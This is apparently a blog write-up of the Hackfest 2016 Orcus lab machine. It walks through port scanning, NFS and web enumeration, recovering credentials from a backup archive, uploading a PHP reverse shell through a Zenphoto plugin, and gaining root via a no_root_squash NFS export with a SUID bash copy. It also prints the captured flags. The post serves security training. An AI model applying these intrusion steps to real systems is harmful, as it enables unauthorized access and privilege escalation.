---
layout: post
title: "Hackfest 2016 Orcus"
date: 2019-04-07 22:20:06 +0300
comments: true
categories: [penetration testing, writeups]
keywords: hackfest 2016 orcus, pentest lab, vulnhub, ctf, boot2root, hackfest, orcus
description: Hackfest 2016 Orcuss writeup
---


Today's VM is the third machine in the Hackfest series:

> This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/

> Difficulty : Hard

> Tips:

> If youre stuck enumerate more! Seriously take each service running on the system and enumerate them more!

> Goals: This machine is intended to take a lot of enumeration and understanding of Linux system.

> There are 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box 4. There is something on 
> this box that is different from the others from this series (Quaoar and Sedna) find why its different

<!-- more -->

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 30 disallowed entries (15 shown)
| /exponent.js.php /exponent.js2.php /exponent.php
| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
| /exponent_version.php /getswversion.php /login.php /overrides.php
| /popup.php /selector.php /site_rss.php /source_selector.php
|_/thumb.php
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE CAPA UIDL SASL RESP-CODES STLS PIPELINING TOP
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36199/tcp  mountd
|   100005  1,2,3      38727/udp  mountd
|   100021  1,3,4      41463/tcp  nlockmgr
|   100021  1,3,4      43317/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_imap-capabilities: have more SASL-IR OK LOGIN-REFERRALS ENABLE capabilities Pre-login LOGINDISABLEDA0001 STARTTLS IDLE listed ID LITERAL+ IMAP4rev1 post-login
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
36199/tcp open  mountd      1-3 (RPC #100005)
41463/tcp open  nlockmgr    1-4 (RPC #100021)
54301/tcp open  mountd      1-3 (RPC #100005)
54471/tcp open  mountd      1-3 (RPC #100005)
```

The web server greets us with a familiar planet image. In the background, I started some Samba enumeration, but didn't find anything interesting:

```
smbmap -H 192.168.159.131
[+] Finding open SMB ports....
[+] Guest SMB session established on 192.168.159.131...
[+] IP: 192.168.159.131:445	Name: 192.168.159.131
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	IPC$                                              	NO ACCESS
```

I prefer to leave the web server for last when there are more vectors available, so before further poking at it, I also checked the if something is shared via the NFS:

```
showmount -e 192.168.159.131
Export list for 192.168.159.131:
/tmp *
```

Let's see what we have there:

```
mount -t nfs 192.168.159.131:/tmp /mnt
root@deck:/mnt# ls -alh
total 76K
drwxrwxrwt 10 root root 4.0K Apr  3  2019 .
drwxr-xr-x 19 root root  36K Mar 15 08:27 ..
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .font-unix
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .ICE-unix
drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-dovecot.service-SEiaO9
drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-systemd-timesyncd.service-2AJ3nv
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .Test-unix
drwx------  2 root root 4.0K Apr  3  2019 vmware-root
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .X11-unix
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .XIM-unix
```

I looked around, but didn't find anything to continue from, so back to the web server!

Nmap reported lots of entries in the robots.txt file, so let's have a look:

```
User-agent: *
Crawl-delay: 5
# @@@@@@   @@@@@@@    @@@@@@@  @@@  @@@   @@@@@@
#@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@
#@@!  @@@  @@!  @@@  !@@       @@!  @@@  !@@
#!@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!
#@!@  !@!  @!@!!@!   !@!       @!@  !@!  !!@@!!
#!@!  !!!  !!@!@!    !!!       !@!  !!!   !!@!!!
#!!:  !!!  !!: :!!   :!!       !!:  !!!       !:!
#:!:  !:!  :!:  !:!  :!:       :!:  !:!      !:!
#::::: ::  ::   :::   ::: :::  ::::: ::  :::: ::
# : :  :    :   : :   :: :: :   : :  :   :: : :
Disallow: /exponent.js.php
Disallow: /exponent.js2.php
Disallow: /exponent.php
Disallow: /exponent_bootstrap.php
Disallow: /exponent_constants.php
Disallow: /exponent_php_setup.php
Disallow: /exponent_version.php
Disallow: /getswversion.php
Disallow: /login.php
Disallow: /overrides.php
Disallow: /popup.php
Disallow: /selector.php
Disallow: /site_rss.php
Disallow: /source_selector.php
Disallow: /thumb.php
Disallow: /ABOUT.md
Disallow: /CHANGELOG.md
Disallow: /CREDITS.md
Disallow: /INSTALLATION.md
Disallow: /LICENSE
Disallow: /README.md
Disallow: /RELEASE.md
Disallow: /TODO.md
Disallow: /cgi-bin/
Disallow: /cart/
Disallow: /login/
Disallow: /users/
Disallow: /files/
Disallow: /tmp/
Disallow: /search/

# Sitemap: http://www.mysite.com/sitemap.xml
```

I looked around and the files point to a Exponent Content Management System installation. Trying the login and other pages gives a message that the site is down for maintenance and database is offline. But another potentially interesting find was http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php which gives the message "no direct access allowed".

I looked for exploits for this CMS, but the interesting ones were from older versions. According to the RELEASE.md file, the version here is 2.3.8. I also found that this version should be vulnerable to CVE-2016-7095, but couldn't find a way to exploit it. Since the VM description emphasized enumeration, I fired up gobuster to see if there's more I might have missed on the web server:

```
gobuster -u http://192.168.159.131/ -w /usr/share/wordlists/dirb/big.txt
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/FCKeditor (Status: 301)
/LICENSE (Status: 200)
/admin (Status: 301)
/backups (Status: 301)
/cron (Status: 301)
/external (Status: 301)
/files (Status: 301)
/framework (Status: 301)
/install (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/themes (Status: 301)
/tmp (Status: 301)
/webalizer (Status: 200)
/zenphoto (Status: 301)
```

This is interesting. The first thing I checked was the backups folder.

```
[PARENTDIR]	Parent Directory	 	-
[ ]	SimplePHPQuiz-Backupz.tar.gz	2016-10-31 20:29 	210K
[ ]	ssh-creds.bak	2016-11-01 21:33 	12
```

Got a Forbidden error when trying to access the ssh creds file, but I was able to download the SimplePHPQuiz one. It contained the files for another application that doesn't seem to be installed. I did a search for passwords and got a hit:

```
grep -l -r password *
css/bootstrap.css.map
includes/db_conn.php
```

Inside db_conn.php I found some database credentials:

```php
//Set the database access information as constants
DEFINE ('DB_USER', 'dbuser');
DEFINE ('DB_PASSWORD', 'dbpassword');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'quizdb');
```

Moving on. The /cron folder contains a bunch of PHP files that I couldn't get anything interesting from. The /framework folder was another dead end. But when I went to /zenphoto, I saw that the Zenphoto 1.4.10 installation needed a last step of providing database credentials. It was configured with root@localhost and it got an access denied. In searchsploit I saw a local file inclusion exploit for this version of Zenphoto, so I tried to complete the installation with the previously discovered credentials. It worked and I was then prompted to create an admin user, which I did:

{% img center /images/pentest/orcus/admin.png 'zenphoto admin' 'zenphoto admin' %}

Next I looked at the LFI exploit:

```
Exploit: ZenPhoto 1.4.10 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/38841/
     Path: /usr/share/exploitdb/exploits/php/webapps/38841.txt

Vulnerability Details:
======================
Zen Photos pluginDoc.php PHP file is vulnerable to local file inclusion
that allows attackers
to read arbitrary server files outside of the current web directory by
injecting "../" directory traversal
characters, which can lead to sensitive information disclosure, code
execution or DOS on the victims web server.


Local File Inclusion Codes:
==========================
http://localhost/zenphoto-zenphoto-1.4.10/zp-core/pluginDoc.php?thirdparty=1&extension=../../../xampp
/phpinfo
```

The path didn't work for me. I kept looking around while logged in as admin and noticed a file upload plugin:

{% img center /images/pentest/orcus/plugins.png 'zenphoto upload' 'zenphoto upload' %}

I enabled the elFinder plugin and now I could upload arbitrary files:

{% img center /images/pentest/orcus/upload.png 'zenphoto shell' 'zenphoto shell' %}

## Flag #1 - Standard shell

With the PHP reverse shell uploaded, all I had to do was to go to it in the /uploaded directory and I got a shell and the first flag:

```
nc -vnlp 9000
listening on [any] 9000 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.131] 38806
Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux
 12:02:20 up 25 min,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls /var/www
9bd556e5c961356857d6d527a7973560-zen-cart-v1.5.4-12302014.zip
a0c4f0d176f87ceda9b9890af09ed644-Adem-master.zip
b873fef091715964d207daa19d320a99-zenphoto-zenphoto-1.4.10.tar.gz
flag.txt
html
zenphoto-zenphoto-1.4.10
$ cat flag.txt
868c889965b7ada547fae81f922e45c4
```

## Flag #2 - Getting root

Remembering the NFS share that didn't get us anywhere earlier, I checked the **/etc/exports** file and found something really interesting and good for us:

```
/tmp *(rw,no_root_squash)
```

Not only we had write permissions on the share, which I haven't tried, but no root squash means that our root user can leave a SUID shell owned by root on the share for our www-data user after we copy it there with our low-privilege shell:

```
$ cp /bin/bash root
$ ls -l root
-rwxr-xr-x 1 www-data www-data 1109564 Apr  5 12:13 root
```

Now chown to root:

```
root@deck:/mnt# chown root:root root
root@deck:/mnt# chmod +s root
root@deck:/mnt# ls -l root
-rwsr-sr-x 1 root root 1109564 Apr  5  2019 root
```

Execute the binary and you have root on the box and the 2nd flag:

```
whoami
root
ls /root
flag.txt
cat /root/flag.txt
807307b49314f822985d0410de7d8bfe
```

I didn't poke around for more flags, so this is for this box!

``` 
 ________________________________
/ All generalizations are false, \
| including this one.            |
|                                |
\ -- Mark Twain                  /
 --------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
